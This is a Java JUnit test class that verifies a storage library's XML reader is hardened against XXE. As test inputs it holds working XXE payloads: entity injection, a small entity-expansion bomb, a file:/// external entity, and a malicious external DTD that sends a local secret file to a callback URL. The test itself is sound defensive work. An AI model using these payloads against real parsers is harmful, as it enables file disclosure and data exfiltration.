package io.github.xdstorage.serialization;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpServer;
import io.github.xdstorage.IXdFileStorage;
import io.github.xdstorage.XdStorageConfig;
import io.github.xdstorage.XdStorageProvider;
import io.github.xdstorage.annotations.XdStorageObjectId;
import io.github.xdstorage.code.ValueChild;
import io.github.xdstorage.exceptions.XdStorageIOException;
import io.github.xdstorage.helpers.XdStorageDefaultSimpleTypeHelper;
import io.github.xdstorage.transaction.IXdStorageTransaction;
import io.github.xdstorage.utils.XdStorageObjectUtils;
import org.junit.jupiter.api.AfterAll;
import org.junit.jupiter.api.BeforeAll;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.Arguments;
import org.junit.jupiter.params.provider.MethodSource;

import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLResolver;
import javax.xml.stream.XMLStreamException;
import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.UUID;
import java.util.concurrent.Callable;
import java.util.concurrent.CopyOnWriteArrayList;
import java.util.stream.Stream;

import static org.junit.jupiter.api.Assertions.*;

/**
 * XXE (docs/tasks/2.2.0/36) — the XML reader must not process DTDs. A storage file is DATA;
 * a folder authored elsewhere must not make the reader expand entities, read local files as
 * entities or contact remote addresses (CWE-611). The stock parser refuses an external
 * general entity inside an attribute value, but it still processes the DTD itself: an
 * internal entity is expanded into any stored value, an external parameter entity is read
 * from disk, and an external DTD is fetched. All four parse sites share one hardened factory.
 */
@DisplayName("XXE (2.2.0/36): читатель XML не обрабатывает DTD и внешние сущности")
public class XdStorageXmlExternalEntityHardeningTest {

    /** The content of the "secret" the attacks try to read out — it must never reach a parsed value or the wire. */
    private static final String CANARY = "XXE-CANARY-7f3a9c51";

    /** The value a DTD-defined entity puts in place of a stored one. */
    private static final String INJECTED = "ATTACKER-CONTROLLED-7f3a9c";

    private static final String STRING_ID = StringIdEntity.class.getName();
    private static final String LONG_ID = LongIdEntity.class.getName();

    private static Path secretFile;

    public static class StringIdEntity {
        @XdStorageObjectId
        private String id;
        private String note;

        public String getId() { return id; }
        public void setId(String id) { this.id = id; }
        public String getNote() { return note; }
        public void setNote(String note) { this.note = note; }
    }

    public static class LongIdEntity {
        @XdStorageObjectId
        private Long id;
        private String note;

        public Long getId() { return id; }
        public void setId(Long id) { this.id = id; }
        public String getNote() { return note; }
        public void setNote(String note) { this.note = note; }
    }

    /** One reader entry point. */
    interface ParseSite {
        Object parse(XdStorageDefaultObjectsReader reader, Reader source) throws Exception;
    }

    @BeforeAll
    public static void createTheSecret() throws IOException {
        secretFile = Files.createTempFile("xdstorage_xxe_secret_", ".txt");
        Files.write(secretFile, CANARY.getBytes(StandardCharsets.UTF_8));
    }

    @AfterAll
    public static void deleteTheSecret() {
        secretFile.toFile().delete();
    }

    private final XdStorageDefaultObjectsReader reader =
            new XdStorageDefaultObjectsReader(new XdStorageDefaultSimpleTypeHelper());

    private static String withInternalSubset(final String declarations) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!DOCTYPE objects [ " + declarations + " ]>\n";
    }

    /** The four parse sites, each with the document that would carry a DTD-defined value out. */
    static Stream<Arguments> parseSites() {
        return Stream.of(
                Arguments.of("read(Reader)", (ParseSite) (r, s) -> r.read(s),
                        "<objects><object name=\"note\" class=\"java.lang.String\" value=\"&injected;\"/></objects>"),
                Arguments.of("read(Reader, transaction)", (ParseSite) (r, s) -> r.read(s, null),
                        "<objects><object name=\"note\" class=\"java.lang.String\" value=\"&injected;\"/></objects>"),
                Arguments.of("readReferences(Reader, idField)", (ParseSite) (r, s) -> r.readReferences(s,
                        XdStorageObjectUtils.getClassInfo(StringIdEntity.class).getIdField()),
                        "<objects><reference class=\"" + STRING_ID + "\" classObjectId=\"java.lang.String\" "
                                + "objectId=\"&injected;\"/></objects>"),
                Arguments.of("readData(Reader, idField)", (ParseSite) (r, s) -> r.readData(s,
                        XdStorageObjectUtils.getClassInfo(LongIdEntity.class).getIdField()),
                        "<objects><object class=\"" + LONG_ID + "\"><primitive name=\"id\" class=\"long\" value=\"7\"/>"
                                + "<object name=\"note\" class=\"java.lang.String\" value=\"&injected;\"/>"
                                + "</object></objects>"));
    }

    // === the four parse sites: a DTD-bearing document is refused, nothing defined in it gets through ===

    @ParameterizedTest(name = "{0}")
    @MethodSource("parseSites")
    @DisplayName("Четыре точки разбора: документ с DTD отклоняется, сущность не попадает в данные")
    public void parseSite_RefusesDtd(final String site, final ParseSite parse, final String document) {
        final String xml = withInternalSubset("<!ENTITY injected \"" + INJECTED + "\">") + document;
        assertRefused(() -> parse.parse(reader, new StringReader(xml)), INJECTED);
    }

    @Test
    @DisplayName("Раскрывание сущностей (малый «миллиард смеха»): читатель отказывает")
    public void entityExpansionIsRefused() {
        final String declarations = "<!ENTITY a \"AAAAAAAAAA\"><!ENTITY b \"&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;\">"
                + "<!ENTITY c \"&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;\">";
        final String xml = withInternalSubset(declarations)
                + "<objects><object name=\"note\" class=\"java.lang.String\" value=\"&c;\"/></objects>";
        assertRefused(() -> reader.read(new StringReader(xml)), "AAAAAAAAAA");
    }

    @Test
    @DisplayName("Внешняя параметрическая сущность: читатель не пытается прочитать файл с диска")
    public void externalParameterEntity_IsRefusedWithoutReadingTheFile() {
        final String parameterEntity = "<!ENTITY % remote SYSTEM \"file:///nonexistent-xdstorage-entity\">%remote;";
        final String xml = withInternalSubset(parameterEntity)
                + "<objects><object name=\"note\" class=\"java.lang.String\" value=\"benign\"/></objects>";
        assertRefused(() -> reader.read(new StringReader(xml)), null);
    }

    @Test
    @DisplayName("Внешнее DTD по сети: адрес не запрашивается, секрет не уходит обратным вызовом")
    public void remoteDtdIsNeverFetchedAndCannotExfiltrate() throws IOException {
        final List<String> requested = new CopyOnWriteArrayList<>();
        final HttpServer server = HttpServer.create(new InetSocketAddress("127.0.0.1", 0), 0);
        final String origin = "http://127.0.0.1:" + server.getAddress().getPort();
        server.createContext("/", exchange -> {
            requested.add(exchange.getRequestURI().getPath() + "?" + exchange.getRequestURI().getQuery());
            respond(exchange, "/evil.dtd".equals(exchange.getRequestURI().getPath()) ? remoteDtd(origin) : "");
        });
        server.start();
        try {
            // the document names a REMOTE dtd; that dtd defines the entity the value refers to and
            // tries to send the secret file back to its own origin
            final String xml = "<?xml version=\"1.0\"?>\n<!DOCTYPE objects SYSTEM \"" + origin + "/evil.dtd\">\n"
                    + "<objects><object name=\"note\" class=\"java.lang.String\" value=\"&injected;\"/></objects>";

            final Object outcome = outcome(() -> reader.read(new StringReader(xml)));

            assertTrue(requested.isEmpty(), "the parser must never contact the DTD origin; requested: " + requested
                    + (requested.toString().contains(CANARY) ? "  <<< THE SECRET LEFT THROUGH THE CALLBACK" : ""));
            assertRefusedOutcome(outcome, INJECTED);
        } finally {
            server.stop(0);
        }
    }

    @Test
    @DisplayName("Внешний DTD-файл на диске: читатель его не читает")
    public void externalDtdFileIsNeverRead() throws IOException {
        final Path evil = Files.createTempFile("xdstorage_xxe_evil", ".dtd");
        Files.write(evil, remoteDtd("http://127.0.0.1:9").getBytes(StandardCharsets.UTF_8));
        try {
            final String xml = "<?xml version=\"1.0\"?>\n<!DOCTYPE objects SYSTEM \"" + evil.toUri() + "\">\n"
                    + "<objects><object name=\"note\" class=\"java.lang.String\" value=\"&injected;\"/></objects>";
            assertRefused(() -> reader.read(new StringReader(xml)), "FROM-THE-REMOTE-DTD");
        } finally {
            evil.toFile().delete();
        }
    }

    // === the benign corpus: nothing legitimate depends on DTD processing ===

    @Test
    @DisplayName("Обычный XML без DTD читается как раньше: встроенные сущности и ссылки на символы")
    public void benignDocumentsAreUnchanged() throws Exception {
        final String xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?><objects>"
                + "<object name=\"a\" class=\"java.lang.String\" "
                + "value=\"x &amp; y &lt; z &gt; w &quot;q&quot; &apos;p&apos; &#1040;&#x42;\"/>"
                + "<!-- a comment between the objects -->"
                + "<object class=\"" + LONG_ID + "\"><primitive name=\"id\" class=\"long\" value=\"7\"/>"
                + "<object name=\"note\" class=\"java.lang.String\" value=\"&lt;no dtd&gt;\"/></object>"
                + "<object name=\"c\" class=\"java.lang.String\" value=\"DOCTYPE is a fine word in DATA\"/>"
                + "</objects>";

        final List<Object> objects = new ArrayList<>(reader.read(new StringReader(xml)));

        assertEquals(3, objects.size());
        assertEquals("x & y < z > w \"q\" 'p' \u0410B", objects.get(0));
        final LongIdEntity entity = (LongIdEntity) objects.get(1);
        assertEquals(Long.valueOf(7L), entity.getId());
        assertEquals("<no dtd>", entity.getNote());
        assertEquals("DOCTYPE is a fine word in DATA", objects.get(2));
    }

    // === the control itself: one parser entry point in the whole engine, and it is hardened ===

    @Test
    @DisplayName("Защищённая фабрика: DTD и внешние сущности выключены, резолвер сущностей отказывает")
    public void theFactoryItselfIsHardened() {
        final XMLInputFactory factory = XdStorageDefaultObjectsReader.newHardenedInputFactory();
        assertEquals(Boolean.FALSE, factory.getProperty(XMLInputFactory.SUPPORT_DTD));
        assertEquals(Boolean.FALSE, factory.getProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES));
        // the second line: were a parser to ask anyway, the resolver refuses
        final XMLResolver resolver = factory.getXMLResolver();
        assertNotNull(resolver, "the hardened factory installs its own resolver");
        final XMLStreamException refusal = assertThrows(XMLStreamException.class,
                () -> resolver.resolveEntity(null, secretFile.toUri().toString(), null, null));
        assertTrue(refusal.getMessage().contains("DOCTYPE"), refusal.getMessage());
    }

    @Test
    @DisplayName("Защищённая фабрика — единственное место создания StAX-парсера в движке")
    public void theHardenedFactoryIsTheOnlyParserEntryPoint() throws IOException {
        final Path sources = Paths.get("src/main/java").toAbsolutePath();
        assertTrue(Files.isDirectory(sources), "the engine sources must be reachable from the run directory: "
                + sources);
        final List<String> sites = new ArrayList<>();
        try (Stream<Path> files = Files.walk(sources)) {
            files.filter(p -> p.toString().endsWith(".java")).forEach(file -> {
                try {
                    final List<String> lines = Files.readAllLines(file, StandardCharsets.UTF_8);
                    for (int i = 0; i < lines.size(); i++) {
                        if (lines.get(i).contains("XMLInputFactory.newInstance(")) {
                            sites.add(sources.relativize(file) + ":" + (i + 1));
                        }
                    }
                } catch (final IOException e) {
                    throw new IllegalStateException("cannot read " + file, e);
                }
            });
        }
        final List<String> files = new ArrayList<>();
        for (final String site : sites) {
            files.add(site.substring(0, site.lastIndexOf(':')));
        }
        assertEquals(Collections.singletonList(
                        "io/github/xdstorage/serialization/XdStorageDefaultObjectsReader.java"), files,
                "XMLInputFactory.newInstance() may appear only inside the hardened-factory helper; found: " + sites);
    }

    // === a real folder: the user-visible contract ===

    @Test
    @DisplayName("Папка XML-хранилища с DTD: загрузка падает громко, подменённое значение не попадает в объект")
    public void storageFolderWithADtd_FailsLoudlyOnLoad() throws Exception {
        final Path folder = Files.createTempDirectory("xdstorage_xxe_");
        final String storageName = "xxe-" + UUID.randomUUID();
        // W-1: the journal is the YAML-only write path — the XML format stores the base file directly
        final XdStorageConfig config = XdStorageConfig.builder().journalWrites(false).build();
        IXdFileStorage storage = XdStorageProvider.newOrGetFileStorage(storageName, folder.toString(), 200,
                FilesFormat.XML, config);
        try {
            final ValueChild child = new ValueChild();
            child.setId(1L);
            child.setLabel("benign-value");
            final IXdStorageTransaction writeTx = storage.beginTransaction(30_000L);
            storage.save(child, writeTx);
            writeTx.commit();
            storage.shutdown();

            // someone else edits the folder: a DTD and an entity in place of the stored value
            final Path dataFile;
            try (Stream<Path> files = Files.walk(folder)) {
                dataFile = files.filter(p -> containsToken(p, "benign-value")).findFirst()
                        .orElseThrow(() -> new IllegalStateException("no data file carries the saved object"));
            }
            final String stored = new String(Files.readAllBytes(dataFile), StandardCharsets.UTF_8);
            final int declarationEnd = stored.indexOf("?>") + 2;
            assertTrue(declarationEnd > 1, "the engine's XML files start with an XML declaration: " + stored);
            final String crafted = stored.substring(0, declarationEnd)
                    + "\n<!DOCTYPE objects [ <!ENTITY injected \"" + INJECTED + "\"> ]>\n"
                    + stored.substring(declarationEnd).replace("benign-value", "&injected;");
            Files.write(dataFile, crafted.getBytes(StandardCharsets.UTF_8));

            storage = XdStorageProvider.newOrGetFileStorage(storageName, folder.toString(), 200, FilesFormat.XML,
                    config);
            final IXdFileStorage reopened = storage;
            final IXdStorageTransaction readTx = reopened.beginTransaction(30_000L);
            assertRefused(() -> reopened.load(ValueChild.class, 1L, readTx), INJECTED);
        } finally {
            storage.shutdown();
        }
    }

    // === helpers ===

    /** A malicious external DTD: it defines the value the document refers to, and tries to send the secret back. */
    private static String remoteDtd(final String origin) {
        return "<!ENTITY injected \"FROM-THE-REMOTE-DTD\">\n"
                + "<!ENTITY % file SYSTEM \"" + secretFile.toUri() + "\">\n"
                + "<!ENTITY % eval \"<!ENTITY &#37; exfil SYSTEM '" + origin + "/leak?x=%file;'>\">\n"
                + "%eval;\n%exfil;\n";
    }

    private static void respond(final HttpExchange exchange, final String body) throws IOException {
        final byte[] bytes = body.getBytes(StandardCharsets.UTF_8);
        exchange.sendResponseHeaders(200, bytes.length);
        exchange.getResponseBody().write(bytes);
        exchange.close();
    }

    private static boolean containsToken(final Path file, final String token) {
        try {
            return Files.isRegularFile(file)
                    && new String(Files.readAllBytes(file), StandardCharsets.UTF_8).contains(token);
        } catch (final IOException e) {
            return false;
        }
    }

    /** {@code null} when the call returned normally — otherwise the exception it threw. */
    private static Object outcome(final Callable<?> call) {
        try {
            return call.call();
        } catch (final Exception failure) {
            return failure;
        }
    }

    /** The reader's own refusal to a DOCTYPE, when the failure chain carries one. */
    private static XdStorageIOException dtdRefusalIn(final Throwable failure) {
        for (Throwable t = failure; t != null; t = t.getCause()) {
            if (t instanceof XdStorageIOException && t.getMessage() != null && t.getMessage().contains("DOCTYPE")) {
                return (XdStorageIOException) t;
            }
        }
        return null;
    }

    private static void assertRefused(final Callable<?> read, final String mustNotAppear) {
        assertRefusedOutcome(outcome(read), mustNotAppear);
    }

    /**
     * The contract under test: the read throws an {@code XdStorageIOException} naming the DTD (the
     * facade may wrap it), or nothing at all.
     */
    private static void assertRefusedOutcome(final Object outcome, final String mustNotAppear) {
        if (!(outcome instanceof Throwable)) {
            fail("a DTD-bearing document must be refused — the read returned " + outcome
                    + (mustNotAppear != null && String.valueOf(outcome).contains(mustNotAppear)
                    ? "  <<< THE DTD-DEFINED VALUE GOT THROUGH" : ""));
        }
        final Throwable failure = (Throwable) outcome;
        if (dtdRefusalIn(failure) == null) {
            fail("the refusal must be an XdStorageIOException naming the DTD, got " + failure);
        }
        assertFalse(String.valueOf(failure).contains(CANARY), "the refusal must not quote the secret: " + failure);
    }
}
